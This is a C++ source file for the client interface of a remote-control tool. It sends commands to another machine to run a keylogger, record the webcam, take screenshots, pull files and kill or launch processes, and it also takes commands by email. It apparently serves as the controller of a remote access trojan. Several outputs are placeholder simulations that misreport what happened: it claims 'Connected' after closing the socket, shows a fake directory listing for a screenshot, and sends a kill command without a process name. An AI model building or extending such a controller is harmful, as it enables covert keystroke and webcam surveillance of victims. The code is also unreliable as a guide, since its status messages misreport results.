#include "RemoteAdminUI.h"
#include "imgui.h"
#include <cstring>
#include "..\Types.h"
#include "..\..\ClientHandle\checkCommand.h"
#include <wrl/client.h>
#include <winsock2.h>
#include <string>

RemoteAdminUI::RemoteAdminUI() {
    lastCheckTime = std::chrono::steady_clock::now();
}

RemoteAdminUI::~RemoteAdminUI() {
    // Cleanup if needed
}

void RemoteAdminUI::AddResult(const std::string& message, ImVec4 color) {
    results.emplace_back(message, color);
    // Keep only last 100 messages
    if (results.size() > 100) {
        results.erase(results.begin());
    }
}

void RemoteAdminUI::HandleConnect() {
    if (isConnected) {
        // Disconnect
        isConnected = false;
        connectionStatus = "Disconnected";
        activeCommand = CommandState::IDLE;
        AddResult("Disconnected from server", Colors::WARNING);
        closesocket(mySock);
        WSACleanup();
    } else {
        // Connect
        connectionStatus = "Connecting...";
        mySock = connect_to_server(serverIP, std::stoi(serverPort));
        if (mySock == INVALID_SOCKET) {
            AddResult("Could not connect to server", Colors::FAULT);
            std::cerr << "[Client] Could not connect to server\n";
            isConnected = false;
            return;
        }
        closesocket(mySock);
        // Simulate connection for demo
        isConnected = true;
        connectionStatus = "Connected";
        AddResult("Connected to " + std::string(serverIP) + ":" + std::string(serverPort), Colors::SUCCESS);
    }
}

void RemoteAdminUI::ExecuteCommand(CommandState command) {
    if (activeCommand != CommandState::IDLE) {
        AddResult("Another command is already running!", Colors::FAULT);
        return;
    }
    
    activeCommand = command;
    
    // TODO: Replace these with your actual backend calls
    switch (command) {
        case CommandState::LIST_PROCESSES:
            AddResult("Executing: List Processes", Colors::INFO);
            send_manual_command("list_process", serverIP, std::stoi(serverPort));
            SetResultText("received_files/processes_with_pid.txt");
            SimulateCommand("Process Listed:");
            break;
            
        case CommandState::START_PROCESS:
            AddResult("Executing: Start Process - " + std::string(processName), Colors::INFO);
            send_manual_command("start_proccess " + std::string(processName), serverIP, std::stoi(serverPort));
            SimulateCommand("Started process: " + std::string(processName));
            break;
            
        case CommandState::KILL_PROCESS:
            AddResult("Executing: Kill Process - " + std::string(processName), Colors::INFO);
            send_manual_command("stop_proccess", serverIP, std::stoi(serverPort));
            SimulateCommand("Killed process: " + std::string(processName));
            break;
            
        case CommandState::LIST_APPS:
            AddResult("Executing: List Applications", Colors::INFO);
            send_manual_command("list_program", serverIP, std::stoi(serverPort));
            SetResultText("received_files/running_programs.txt");
            SimulateCommand("List Applications");
            break;
            
        case CommandState::START_APP:
            AddResult("Executing: Start App - " + std::string(appName), Colors::INFO);
            send_manual_command("start_program " + std::string(appName), serverIP, std::stoi(serverPort));
            SimulateCommand("Started application: " + std::string(appName));
            break;
            
        case CommandState::STOP_APP:
            AddResult("Executing: Stop App - " + std::string(appName), Colors::INFO);
            send_manual_command("stop_program " + std::string(appName), serverIP, std::stoi(serverPort));
            SimulateCommand("Stopped application: " + std::string(appName));
            break;
            
        case CommandState::SHUTDOWN:
            AddResult("Executing: Shutdown", Colors::INFO);
            send_manual_command("shutdown", serverIP, std::stoi(serverPort));
            SimulateCommand("Server shutdown initiated", Colors::WARNING);
            break;
            
        case CommandState::RESTART:
            AddResult("Executing: Restart", Colors::INFO);
            send_manual_command("restart", serverIP, std::stoi(serverPort));
            SimulateCommand("Server restart initiated", Colors::WARNING);
            break;
            
        case CommandState::KEYLOGGER:
            AddResult("Executing: Keylogger for " + std::to_string(keyloggerDuration) + " seconds", Colors::INFO);
            send_manual_command("keylogger " + std::to_string(keyloggerDuration), serverIP, std::stoi(serverPort));
            SimulateCommand("Keylogger started");
            SetResultText("received_files/keylog.txt");
            break;
            
        case CommandState::START_WEBCAM: {
            AddResult("Executing: Webcam Record", Colors::INFO);
            send_manual_command("start_recording", serverIP, std::stoi(serverPort));
            SimulateCommand("Record started ...");
            break;
        }
        case CommandState::STOP_WEBCAM: {
            AddResult("Executing: Webcam Record", Colors::INFO);
            send_manual_command("stop_recording", serverIP, std::stoi(serverPort));
            LoadMedia("received_files/recording.avi");
            SimulateCommand("Webcam capture completed\nImage saved to: webcam_capture.jpg");
            break;
        }
        case CommandState::GET_FILE:
            AddResult("Executing: Get File - " + std::string(filePath), Colors::INFO);
            send_manual_command("send_file " + string(filePath), serverIP, std::stoi(serverPort));
            SimulateCommand("File downloaded: " + std::string(filePath) + " to received_files/");
            break;
            
        case CommandState::TAKE_SCREENSHOT:
            AddResult("Executing: Take ScreenShot", Colors::INFO);
            send_manual_command("get_screenshot", serverIP, std::stoi(serverPort));
            LoadMedia("received_files/screenshot.png");
            SimulateCommand("Directory listing:\nfile1.txt\nfile2.jpg\nsubfolder/");
            break;
    }
}

void RemoteAdminUI::SimulateCommand(const std::string& result, ImVec4 color) {
    // In real implementation, this would be called when you receive response from server
    AddResult(result, color);
    activeCommand = CommandState::IDLE;
}

void RemoteAdminUI::CheckEmailAutomatically() {
    if (currentMode == UIMode::EMAIL && isConnected) {
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastCheckTime).count() >= 5) {
            lastCheckTime = now;
            
            // Update timestamp
            auto time_now = std::chrono::system_clock::now();
            auto time_t = std::chrono::system_clock::to_time_t(time_now);
            auto tm = *std::localtime(&time_t);
            char buffer[32];
            strftime(buffer, sizeof(buffer), "%H:%M:%S", &tm);
            lastEmailCheck = buffer;
            
            emailStatus = "Checking...";
            
            auto commands = fetch_email_commands();
            for (auto &[cmd, senderEmail] : commands) {
                mySock = connect_to_server(serverIP, std::stoi(serverPort));
                if (mySock == INVALID_SOCKET) {
                    AddResult("Could not connect to server", Colors::FAULT);
                    std::cerr << "[Client] Could not connect to server\n";
                    isConnected = false;
                    return;
                }
                AddResult("[Email] Processing command from " + senderEmail + ": " + cmd, Colors::INFO);
                process_command(cmd, senderEmail, mySock);
                closesocket(mySock);
            }
            

            static bool checking = false;
            if (!checking) {
                checking = true;
                emailStatus = "No new commands";
                checking = false;
            }
        }
    }
}

void RemoteAdminUI::SetResultImage(GLuint texture, int width, int height, const std::string& filename) {
    // Clear previous result
    ClearResult();
    
    // Set new image result
    currentResultTexture = texture;
    currentResultWidth = width;
    currentResultHeight = height;
    currentResultFileName = filename;
}

void RemoteAdminUI::SetResultText(const std::string& filePath) {
    ClearResult();
    
    // Try to read from file
    std::ifstream file(filePath);
    if (!file.is_open()) {
        std::cerr << "[UI] Failed to open file: " << filePath << std::endl;
        currentResultText = "Error: Could not open file - " + filePath;
        return;
    }
    
    // Read entire file content
    std::stringstream buffer;
    buffer << file.rdbuf();
    currentResultText = buffer.str();
    
    file.close();
    
    // Optional: Log success
    //std::cout << "[UI] Successfully loaded text from: " << filePath << std::endl;
    //std::cout << "[UI] Content length: " << currentResultText.length() << " characters" << std::endl;
}

void RemoteAdminUI::ClearResult() {
    // Don't delete the texture here - you manage that in your logic
    currentResultTexture = 0;
    currentResultWidth = 0;
    currentResultHeight = 0;
    currentResultFileName = "";
    currentResultText = "";
}


